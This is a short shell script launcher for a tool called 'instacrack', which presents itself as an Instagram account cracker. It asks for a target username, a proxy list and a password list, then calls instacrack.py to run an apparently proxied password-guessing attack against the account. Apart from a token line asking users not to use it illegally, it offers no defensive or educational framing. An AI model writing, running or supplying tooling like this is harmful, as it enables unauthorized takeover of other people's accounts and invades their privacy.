echo instacrack 'The Ultimate Instagram Account Cracker';
echo                            ;
echo Please do not use for illegal purposes!;
echo                            ;
echo Please input the account username:;
read ACCOUNT;
echo Proxy list to upload to database:;
read PROXY;
python3 instacrack.py -px $PROXY;
echo List of Passwords: ;
read PASSWDLIST;
python3 instacrack.py -u $ACCOUNT -p $PASSWDLIST 


echo "Thank you for using instacrack!"
